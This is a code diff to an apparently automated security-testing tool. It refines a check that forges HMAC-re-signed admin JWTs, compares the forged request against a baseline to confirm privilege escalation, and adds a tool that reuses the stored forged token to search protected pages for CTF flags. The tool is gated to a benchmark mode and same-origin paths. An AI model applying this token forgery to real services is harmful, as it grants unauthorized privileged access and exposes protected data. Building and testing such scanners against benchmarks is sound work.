@@ -8,7 +8,7 @@ import hmac
 import json
 import re
 import uuid
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from typing import Any
 from urllib.parse import urljoin, urlparse
 
@@ -37,6 +37,8 @@ class AuthSession:
     session: requests.Session
     jwt_cookie: str | None
     jwt_token: str | None
+    privileged_token: str | None = None
+    validated_paths: set[str] = field(default_factory=set)
 
 
 _sessions: dict[str, AuthSession] = {}
@@ -52,6 +54,22 @@ def _safe_claims(value: Any) -> Any:
 
 def _get_session(session_ref: str) -> AuthSession | None:
     return _sessions.get(session_ref)
+
+
+def _session_cookies(stored: AuthSession, token: str | None = None) -> requests.cookies.RequestsCookieJar:
+    cookies = requests.cookies.RequestsCookieJar()
+    for cookie in stored.session.cookies:
+        value = token if token and cookie.name == stored.jwt_cookie else cookie.value
+        cookies.set(cookie.name, value, domain=cookie.domain, path=cookie.path)
+    return cookies
+
+
+def _denied_response(response: requests.Response) -> bool:
+    if response.status_code in {401, 403}:
+        return True
+    text = response.text.lower()
+    markers = ("not admin", "not an admin", "login to access", "unauthorized", "forbidden", "access denied", "permission denied")
+    return any(marker in text for marker in markers)
 
 
 def _jwt_from_cookies(session: requests.Session) -> tuple[str | None, str | None]:
@@ -186,17 +204,93 @@ def session_jwt_privilege_check(session_ref: str, path: str, claim: str = "admin
     hasher = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[metadata["algorithm"]]
     forged = f"{signing_input}.{_b64url_encode(hmac.new(secret.encode(), signing_input.encode(), hasher).digest())}"
     try:
-        cookies = requests.cookies.RequestsCookieJar()
-        for cookie in stored.session.cookies:
-            cookies.set(cookie.name, forged if cookie.name == stored.jwt_cookie else cookie.value, domain=cookie.domain, path=cookie.path)
-        response = requests.get(target, cookies=cookies, timeout=10, verify=False)
+        baseline = requests.get(target, cookies=_session_cookies(stored), allow_redirects=False, timeout=10, verify=False)
+        response = requests.get(target, cookies=_session_cookies(stored, forged), allow_redirects=False, timeout=10, verify=False)
+        baseline_hash = hashlib.sha256(baseline.content).hexdigest()
         body_hash = hashlib.sha256(response.content).hexdigest()
+        baseline_denied = _denied_response(baseline)
+        content_changed = baseline_hash != body_hash
+        validated = bool(
+            baseline_denied
+            and response.status_code in {200, 201, 202, 204}
+            and content_changed
+        )
+        if validated:
+            stored.privileged_token = forged
+            stored.validated_paths.add(target)
         return ToolResult(
             tool="session_jwt_privilege_check", target=target, status="ok",
-            summary=f"Benchmark privilege validation returned HTTP {response.status_code}",
-            raw_excerpt=f"[session_jwt_privilege_check]\nTarget: {target}\nStatus: {response.status_code}\nResponse SHA-256: {body_hash}\nPrivilege claim validation completed.",
-            findings=[Finding("JWT privilege claim forgery accepted", "critical", "confirmed", "jwt_attack", [Evidence("jwt_privilege_validation", "Benchmark protected endpoint accepted a re-signed privileged JWT.", target)], [])] if response.status_code == 200 else [],
-            data={"status_code": response.status_code, "response_sha256": body_hash, "claim": claim, "validated": response.status_code == 200},
+            summary="Benchmark privilege validation verified" if validated else "Benchmark privilege validation was inconclusive",
+            raw_excerpt=(
+                f"[session_jwt_privilege_check]\nTarget: {target}\n"
+                f"Baseline status: {baseline.status_code}\nForged status: {response.status_code}\n"
+                f"Baseline denied: {'yes' if baseline_denied else 'no'}\n"
+                f"Response changed: {'yes' if content_changed else 'no'}\n"
+                f"Forged response SHA-256: {body_hash}\n"
+                f"Privilege validation: {'verified' if validated else 'inconclusive'}"
+            ),
+            findings=[Finding("JWT privilege claim forgery accepted", "critical", "confirmed", "jwt_attack", [Evidence("jwt_privilege_validation", "A re-signed privileged JWT changed an access-denied response to an allowed response.", target)], [])] if validated else [],
+            data={
+                "baseline_status_code": baseline.status_code,
+                "baseline_sha256": baseline_hash,
+                "baseline_denied": baseline_denied,
+                "status_code": response.status_code,
+                "response_sha256": body_hash,
+                "content_changed": content_changed,
+                "claim": claim,
+                "validated": validated,
+            },
         ).to_text()
     except Exception as exc:
         return error_result("session_jwt_privilege_check", target, exc).to_text()
+
+
+@tool
+def session_response_search(session_ref: str, path: str, keyword_or_regex: str) -> str:
+    """Only in benchmark mode, search a previously verified privileged session response.
+
+    The request remains bound to an in-memory session and same-origin path. It returns
+    bounded matching context, so a CTF flag can be reported without exposing the JWT.
+    """
+    if _scan_mode.get() != "benchmark":
+        return error_result("session_response_search", session_ref, "authenticated response search is restricted to benchmark mode").to_text()
+    stored = _get_session(session_ref)
+    if stored is None or not stored.privileged_token:
+        return error_result("session_response_search", session_ref, "a verified privileged JWT session is required").to_text()
+    target = normalize_url(urljoin(stored.origin + "/", path))
+    if not same_origin(stored.origin, target):
+        return error_result("session_response_search", target, "target is outside the authenticated session origin").to_text()
+    if target not in stored.validated_paths:
+        return error_result("session_response_search", target, "privilege validation for this path is required first").to_text()
+    query = keyword_or_regex.strip()
+    if not query:
+        return error_result("session_response_search", target, "keyword_or_regex must not be empty").to_text()
+    try:
+        pattern = re.compile(query[6:] if query.startswith("regex:") else re.escape(query))
+    except re.error as exc:
+        return error_result("session_response_search", target, f"invalid regular expression: {exc}").to_text()
+    try:
+        response = requests.get(target, cookies=_session_cookies(stored, stored.privileged_token), allow_redirects=False, timeout=10, verify=False)
+        body = response.text
+        if len(response.content) > 2 * 1024 * 1024:
+            return error_result("session_response_search", target, "response exceeds the 2 MiB search limit").to_text()
+        matches = list(pattern.finditer(body))
+        contexts = []
+        for match in matches[:10]:
+            start = max(0, match.start() - 120)
+            end = min(len(body), match.end() + 120)
+            contexts.append(body[start:end])
+        return ToolResult(
+            tool="session_response_search", target=target, status="ok",
+            summary=f"Privileged response search: {'matches' if matches else 'no matches'} ({len(matches)} matches)",
+            raw_excerpt=(
+                f"[session_response_search] {target}\nStatus: {response.status_code}\n"
+                f"Response SHA-256: {hashlib.sha256(response.content).hexdigest()}\n"
+                f"Matches: {len(matches)}\n" + "\n---\n".join(contexts)
+            ),
+            request=RequestRecord("GET", target),
+            response=ResponseRecord(status_code=response.status_code, content_type=response.headers.get("Content-Type"), body_length=len(response.content)),
+            data={"match_count": len(matches), "response_sha256": hashlib.sha256(response.content).hexdigest(), "path_verified": True},
+        ).to_text()
+    except Exception as exc:
+        return error_result("session_response_search", target, exc).to_text()
